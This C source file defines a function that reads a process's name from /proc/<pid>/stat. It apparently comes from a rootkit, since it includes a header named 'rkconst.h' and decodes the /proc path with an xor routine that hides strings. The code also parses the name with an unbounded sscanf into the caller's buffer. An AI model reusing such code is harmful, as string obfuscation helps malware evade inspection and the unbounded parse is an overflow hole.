#include <string.h> 
#include <stdio.h> 
#include "../rkconst.h"

int name_from_pid(char *pid, char *buf)
{ 
	if (strspn(pid, "0123456789") != strlen(pid)) return 0; 
	char tmp[256]; 
	char *proc = strdup(PROC); xor(proc);
	
	/* find dir of pid in proc */
	snprintf(tmp, sizeof(tmp), "%s/%s/stat", proc, pid); 
	FILE* f = fopen(tmp, "r"); 
	if (f==NULL) return 0; 
	if (fgets(tmp, sizeof(tmp), f) == NULL)
	{ 
		CLEAN(proc);
		fclose(f); 
		return 0; 
	}
	fclose(f);
	int i; 
	/* find (name) in stat and put in buf) */
	sscanf(tmp, "%d (%[^)]s", &i, buf); 
	CLEAN(proc);
	return 1;
}

